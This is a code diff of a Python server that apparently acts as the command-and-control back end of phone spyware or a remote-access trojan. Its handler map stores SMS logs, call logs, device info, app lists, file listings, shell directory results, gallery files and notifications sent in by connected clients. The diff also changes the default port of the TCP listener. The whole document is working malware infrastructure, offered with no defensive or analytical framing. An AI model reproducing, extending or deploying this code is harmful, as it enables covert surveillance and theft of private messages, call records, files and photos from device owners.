@@ -51,12 +51,11 @@ def handle_incoming_data(data, client_id):
 
             # Simplified logic for data handling
             handler_map = {
-                'SMS_LOG': lambda p: client_data['sms_logs'].append(p.get('log')),
-                'CALL_LOG': lambda p: client_data['call_logs'].append(p.get('log')),
+                'SMS_LOG': lambda p: client_data['sms_logs'].extend(p.get('logs')),
+                'CALL_LOG': lambda p: client_data['call_logs'].extend(p.get('logs')),
                 'DEVICE_INFO': lambda p: client_data['device_info'].update(p.get('info')),
                 'APP_LIST': lambda p: client_data['apps'].extend(p.get('apps')),
-                'SHELL_LS_RESULT': lambda p: client_data['file_manager']['files'].extend(p.get("files")),
-                'FILE_MANAGER_RESULT': lambda p: client_data['file_manager']['files'].extend(p.get("files")),
+                'FILE_MANAGER_RESULT': lambda p: client_data['file_manager'].update(p.get("listing")),
                 'SHELL_CD_SUCCESS': lambda p: client_data['file_manager'].update({"path": p.get("current_dir"), "files": []}),
                 'GALLERY_PAGE_DATA': lambda p: client_data['gallery']['files'].extend(p.get("files")),
                 'NOTIFICATION_DATA': lambda p: client_data['notifications'].insert(0, p.get("notification")),
@@ -123,7 +122,7 @@ def handle_client_connection(conn, client_id):
 def tcp_listener():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    tcp_port = int(os.environ.get("TCP_PORT", 8888))
+    tcp_port = int(os.environ.get("TCP_PORT", 7777))
     server.bind(('0.0.0.0', tcp_port))
     server.listen(5)
     add_log(f"[*] TCP Server listening on port {tcp_port}")
